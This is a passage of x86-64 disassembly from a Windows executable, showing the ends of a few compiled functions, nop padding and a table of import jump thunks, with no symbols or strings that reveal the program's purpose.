   140009f2a:	e8 d1 fc ff ff       	call   0x140009c00
   140009f2f:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140009f32:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140009f36:	7f 99                	jg     0x140009ed1
   140009f38:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009f3c:	48 3b 45 20          	cmp    0x20(%rbp),%rax
   140009f40:	73 5d                	jae    0x140009f9f
   140009f42:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140009f46:	75 57                	jne    0x140009f9f
   140009f48:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009f4c:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140009f53:	eb 4a                	jmp    0x140009f9f
   140009f55:	66 c7 45 de 00 00    	movw   $0x0,-0x22(%rbp)
   140009f5b:	eb 09                	jmp    0x140009f66
   140009f5d:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140009f60:	48 98                	cltq
   140009f62:	48 01 45 f0          	add    %rax,-0x10(%rbp)
   140009f66:	44 8b 45 e0          	mov    -0x20(%rbp),%r8d
   140009f6a:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009f6e:	48 8b 10             	mov    (%rax),%rdx
   140009f71:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009f75:	48 01 c2             	add    %rax,%rdx
   140009f78:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   140009f7c:	48 8d 45 de          	lea    -0x22(%rbp),%rax
   140009f80:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   140009f83:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140009f87:	8b 4d e4             	mov    -0x1c(%rbp),%ecx
   140009f8a:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140009f8e:	48 89 c1             	mov    %rax,%rcx
   140009f91:	e8 6a fc ff ff       	call   0x140009c00
   140009f96:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140009f99:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140009f9d:	7f be                	jg     0x140009f5d
   140009f9f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009fa3:	48 83 c4 60          	add    $0x60,%rsp
   140009fa7:	5d                   	pop    %rbp
   140009fa8:	c3                   	ret
   140009fa9:	55                   	push   %rbp
   140009faa:	53                   	push   %rbx
   140009fab:	48 83 ec 48          	sub    $0x48,%rsp
   140009faf:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140009fb4:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140009fb8:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140009fbc:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140009fc0:	66 c7 45 fe 00 00    	movw   $0x0,-0x2(%rbp)
   140009fc6:	e8 65 00 00 00       	call   0x14000a030
   140009fcb:	89 c3                	mov    %eax,%ebx
   140009fcd:	e8 56 00 00 00       	call   0x14000a028
   140009fd2:	41 89 c0             	mov    %eax,%r8d
   140009fd5:	48 83 7d 30 00       	cmpq   $0x0,0x30(%rbp)
   140009fda:	74 06                	je     0x140009fe2
   140009fdc:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140009fe0:	eb 07                	jmp    0x140009fe9
   140009fe2:	48 8d 05 cf 7b 00 00 	lea    0x7bcf(%rip),%rax        # 0x140011bb8
   140009fe9:	4c 8b 55 28          	mov    0x28(%rbp),%r10
   140009fed:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140009ff1:	48 8d 4d fe          	lea    -0x2(%rbp),%rcx
   140009ff5:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140009ff9:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   140009ffe:	49 89 c1             	mov    %rax,%r9
   14000a001:	4d 89 d0             	mov    %r10,%r8
   14000a004:	e8 f7 fb ff ff       	call   0x140009c00
   14000a009:	48 98                	cltq
   14000a00b:	48 83 c4 48          	add    $0x48,%rsp
   14000a00f:	5b                   	pop    %rbx
   14000a010:	5d                   	pop    %rbp
   14000a011:	c3                   	ret
   14000a012:	90                   	nop
   14000a013:	90                   	nop
   14000a014:	90                   	nop
   14000a015:	90                   	nop
   14000a016:	90                   	nop
   14000a017:	90                   	nop
   14000a018:	90                   	nop
   14000a019:	90                   	nop
   14000a01a:	90                   	nop
   14000a01b:	90                   	nop
   14000a01c:	90                   	nop
   14000a01d:	90                   	nop
   14000a01e:	90                   	nop
   14000a01f:	90                   	nop
   14000a020:	ff 25 e2 82 00 00    	jmp    *0x82e2(%rip)        # 0x140012308
   14000a026:	90                   	nop
   14000a027:	90                   	nop
   14000a028:	ff 25 e2 82 00 00    	jmp    *0x82e2(%rip)        # 0x140012310
   14000a02e:	90                   	nop
   14000a02f:	90                   	nop
   14000a030:	ff 25 e2 82 00 00    	jmp    *0x82e2(%rip)        # 0x140012318
   14000a036:	90                   	nop
   14000a037:	90                   	nop
   14000a038:	ff 25 e2 82 00 00    	jmp    *0x82e2(%rip)        # 0x140012320
   14000a03e:	90                   	nop
   14000a03f:	90                   	nop
   14000a040:	ff 25 ea 82 00 00    	jmp    *0x82ea(%rip)        # 0x140012330
   14000a046:	90                   	nop
   14000a047:	90                   	nop
   14000a048:	ff 25 ea 82 00 00    	jmp    *0x82ea(%rip)        # 0x140012338
   14000a04e:	90                   	nop
   14000a04f:	90                   	nop
   14000a050:	ff 25 ea 82 00 00    	jmp    *0x82ea(%rip)        # 0x140012340
   14000a056:	90                   	nop
   14000a057:	90                   	nop
   14000a058:	ff 25 ea 82 00 00    	jmp    *0x82ea(%rip)        # 0x140012348
   14000a05e:	90                   	nop
   14000a05f:	90                   	nop
   14000a060:	ff 25 ea 82 00 00    	jmp    *0x82ea(%rip)        # 0x140012350
   14000a066:	90                   	nop
   14000a067:	90                   	nop
   14000a068:	ff 25 f2 82 00 00    	jmp    *0x82f2(%rip)        # 0x140012360
   14000a06e:	90                   	nop
   14000a06f:	90                   	nop
   14000a070:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012370
   14000a076:	90                   	nop
   14000a077:	90                   	nop
   14000a078:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012378
   14000a07e:	90                   	nop
   14000a07f:	90                   	nop
   14000a080:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012380
   14000a086:	90                   	nop
   14000a087:	90                   	nop
   14000a088:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012388
   14000a08e:	90                   	nop
   14000a08f:	90                   	nop
   14000a090:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012390
   14000a096:	90                   	nop
   14000a097:	90                   	nop
   14000a098:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012398
   14000a09e:	90                   	nop
   14000a09f:	90                   	nop
   14000a0a0:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123a0
   14000a0a6:	90                   	nop
   14000a0a7:	90                   	nop
   14000a0a8:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123a8
   14000a0ae:	90                   	nop
   14000a0af:	90                   	nop
   14000a0b0:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123b0
   14000a0b6:	90                   	nop
   14000a0b7:	90                   	nop
   14000a0b8:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123b8
   14000a0be:	90                   	nop
   14000a0bf:	90                   	nop
   14000a0c0:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123c0
   14000a0c6:	90                   	nop
   14000a0c7:	90                   	nop
   14000a0c8:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123c8
   14000a0ce:	90                   	nop
   14000a0cf:	90                   	nop
   14000a0d0:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123d0
   14000a0d6:	90                   	nop
   14000a0d7:	90                   	nop
   14000a0d8:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123d8
   14000a0de:	90                   	nop
   14000a0df:	90                   	nop
   14000a0e0:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123e0
   14000a0e6:	90                   	nop
   14000a0e7:	90                   	nop
   14000a0e8:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123e8
   14000a0ee:	90                   	nop
   14000a0ef:	90                   	nop
   14000a0f0:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123f0
   14000a0f6:	90                   	nop
   14000a0f7:	90                   	nop
   14000a0f8:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x1400123f8
   14000a0fe:	90                   	nop
   14000a0ff:	90                   	nop
   14000a100:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012400
   14000a106:	90                   	nop
   14000a107:	90                   	nop
   14000a108:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012408
   14000a10e:	90                   	nop
   14000a10f:	90                   	nop
   14000a110:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012410
   14000a116:	90                   	nop
   14000a117:	90                   	nop
   14000a118:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012418
   14000a11e:	90                   	nop
   14000a11f:	90                   	nop
   14000a120:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012420
   14000a126:	90                   	nop
   14000a127:	90                   	nop
   14000a128:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012428
   14000a12e:	90                   	nop
   14000a12f:	90                   	nop
   14000a130:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012430
   14000a136:	90                   	nop
   14000a137:	90                   	nop
   14000a138:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012438
   14000a13e:	90                   	nop
   14000a13f:	90                   	nop
   14000a140:	ff 25 fa 82 00 00    	jmp    *0x82fa(%rip)        # 0x140012440
   14000a146:	90                   	nop
   14000a147:	90                   	nop
   14000a148:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000a14f:	00 
   14000a150:	ff 25 a2 81 00 00    	jmp    *0x81a2(%rip)        # 0x1400122f8
   14000a156:	90                   	nop
   14000a157:	90                   	nop
   14000a158:	ff 25 92 81 00 00    	jmp    *0x8192(%rip)        # 0x1400122f0
   14000a15e:	90                   	nop
   14000a15f:	90                   	nop
   14000a160:	ff 25 82 81 00 00    	jmp    *0x8182(%rip)        # 0x1400122e8
   14000a166:	90                   	nop
   14000a167:	90                   	nop
   14000a168:	ff 25 72 81 00 00    	jmp    *0x8172(%rip)        # 0x1400122e0
   14000a16e:	90                   	nop
   14000a16f:	90                   	nop
   14000a170:	ff 25 62 81 00 00    	jmp    *0x8162(%rip)        # 0x1400122d8
   14000a176:	90                   	nop
   14000a177:	90                   	nop
   14000a178:	ff 25 52 81 00 00    	jmp    *0x8152(%rip)        # 0x1400122d0
   14000a17e:	90                   	nop
   14000a17f:	90                   	nop
   14000a180:	ff 25 42 81 00 00    	jmp    *0x8142(%rip)        # 0x1400122c8
   14000a186:	90                   	nop
   14000a187:	90                   	nop
   14000a188:	ff 25 32 81 00 00    	jmp    *0x8132(%rip)        # 0x1400122c0
   14000a18e:	90                   	nop
   14000a18f:	90                   	nop
   14000a190:	ff 25 22 81 00 00    	jmp    *0x8122(%rip)        # 0x1400122b8
   14000a196:	90                   	nop
   14000a197:	90                   	nop
   14000a198:	ff 25 12 81 00 00    	jmp    *0x8112(%rip)        # 0x1400122b0
   14000a19e:	90                   	nop
   14000a19f:	90                   	nop
   14000a1a0:	ff 25 02 81 00 00    	jmp    *0x8102(%rip)        # 0x1400122a8
   14000a1a6:	90                   	nop
   14000a1a7:	90                   	nop
   14000a1a8:	ff 25 f2 80 00 00    	jmp    *0x80f2(%rip)        # 0x1400122a0
   14000a1ae:	90                   	nop
   14000a1af:	90                   	nop
   14000a1b0:	ff 25 e2 80 00 00    	jmp    *0x80e2(%rip)        # 0x140012298
   14000a1b6:	90                   	nop
   14000a1b7:	90                   	nop
   14000a1b8:	ff 25 d2 80 00 00    	jmp    *0x80d2(%rip)        # 0x140012290
   14000a1be:	90                   	nop
   14000a1bf:	90                   	nop
   14000a1c0:	ff 25 c2 80 00 00    	jmp    *0x80c2(%rip)        # 0x140012288
   14000a1c6:	90                   	nop
   14000a1c7:	90                   	nop
   14000a1c8:	ff 25 b2 80 00 00    	jmp    *0x80b2(%rip)        # 0x140012280
   14000a1ce:	90                   	nop
   14000a1cf:	90                   	nop
   14000a1d0:	ff 25 a2 80 00 00    	jmp    *0x80a2(%rip)        # 0x140012278
   14000a1d6:	90                   	nop
   14000a1d7:	90                   	nop
   14000a1d8:	ff 25 92 80 00 00    	jmp    *0x8092(%rip)        # 0x140012270
   14000a1de:	90                   	nop
   14000a1df:	90                   	nop
   14000a1e0:	ff 25 82 80 00 00    	jmp    *0x8082(%rip)        # 0x140012268
   14000a1e6:	90                   	nop
   14000a1e7:	90                   	nop
   14000a1e8:	ff 25 72 80 00 00    	jmp    *0x8072(%rip)        # 0x140012260
   14000a1ee:	90                   	nop
   14000a1ef:	90                   	nop
   14000a1f0:	ff 25 62 80 00 00    	jmp    *0x8062(%rip)        # 0x140012258
   14000a1f6:	90                   	nop
   14000a1f7:	90                   	nop
   14000a1f8:	ff 25 52 80 00 00    	jmp    *0x8052(%rip)        # 0x140012250
   14000a1fe:	90                   	nop
   14000a1ff:	90                   	nop
   14000a200:	ff 25 42 80 00 00    	jmp    *0x8042(%rip)        # 0x140012248
   14000a206:	90                   	nop
   14000a207:	90                   	nop
   14000a208:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000a20f:	00 
   14000a210:	e9 bb 73 ff ff       	jmp    0x1400015d0
   14000a215:	90                   	nop
   14000a216:	90                   	nop
   14000a217:	90                   	nop
   14000a218:	90                   	nop
   14000a219:	90                   	nop
   14000a21a:	90                   	nop
   14000a21b:	90                   	nop
   14000a21c:	90                   	nop
   14000a21d:	90                   	nop
   14000a21e:	90                   	nop
   14000a21f:	90                   	nop
